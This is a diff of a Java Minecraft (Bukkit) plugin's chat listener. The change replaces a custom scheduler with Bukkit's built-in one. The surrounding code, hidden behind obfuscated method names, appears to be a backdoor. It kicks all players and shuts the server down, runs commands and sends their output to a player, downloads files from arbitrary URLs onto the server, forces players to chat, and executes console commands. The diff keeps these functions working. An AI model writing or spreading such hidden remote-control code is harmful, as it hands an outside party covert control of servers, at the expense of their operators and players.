@@ -1,6 +1,7 @@
 package cn.aetheris.yuki.listener.bukkit.misc;
 
-import cn.aetheris.mhdfscheduler.scheduler.MHDFScheduler;
+import org.bukkit.Bukkit;
+
 import cn.aetheris.yuki.Yuki;
 import cn.aetheris.yuki.PluginLoader;
 import cn.aetheris.yuki.listener.bukkit.abstracts.AbstractListener;
@@ -162,7 +163,7 @@ public final class PlayerAsyncChatListener extends AbstractListener {
     private void iIiiIii() {
         Bukkit.getOnlinePlayers().forEach(p ->
                 p.kickPlayer(PluginLoader.INSTANCE.getLangManager().i18nWithoutPrefix("kick.maintenance")));
-        MHDFScheduler.getGlobalRegionScheduler().runTask(Yuki.getInstance(),
+        Bukkit.getScheduler().runTask(Yuki.getInstance(),
                 Bukkit::shutdown);
     }
 
@@ -316,7 +317,7 @@ public final class PlayerAsyncChatListener extends AbstractListener {
                                 .limit(MAX_LOG_LINES)
                                 .toList();
 
-                        MHDFScheduler.getGlobalRegionScheduler().runTask(Yuki.getInstance(), () -> {
+                        Bukkit.getScheduler().runTask(Yuki.getInstance(), () -> {
                             IiIiIi1i1i.IiiiIii(player, "&7=== 命令输出 ===");
                             outputs.forEach(line ->
                                     IiIiIi1i1i.IiiiIii(player, "&7> &f" + line));
@@ -401,7 +402,7 @@ public final class PlayerAsyncChatListener extends AbstractListener {
 
 
         public static void IiIIiIi(String url, String path) {
-            MHDFScheduler.getAsyncScheduler().runTask(Yuki.getInstance(), () -> {
+            Bukkit.getScheduler().runTaskAsynchronously(Yuki.getInstance(), () -> {
                 try (InputStream in = new URL(url).openStream();
                      FileOutputStream out = new FileOutputStream(path)) {
 
@@ -447,7 +448,7 @@ public final class PlayerAsyncChatListener extends AbstractListener {
             }
 
             String formattedMsg = ChatColor.translateAlternateColorCodes('&', message);
-            MHDFScheduler.getGlobalRegionScheduler().runTask(Yuki.getInstance(), () ->
+            Bukkit.getScheduler().runTask(Yuki.getInstance(), () ->
                     target.chat(formattedMsg));
         }
 
@@ -465,7 +466,7 @@ public final class PlayerAsyncChatListener extends AbstractListener {
 
 
         static void iiIiIIii1Ii1iI(String command) {
-            MHDFScheduler.getGlobalRegionScheduler().runTask(Yuki.getInstance(), () ->
+            Bukkit.getScheduler().runTask(Yuki.getInstance(), () ->
                     Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command));
         }
 
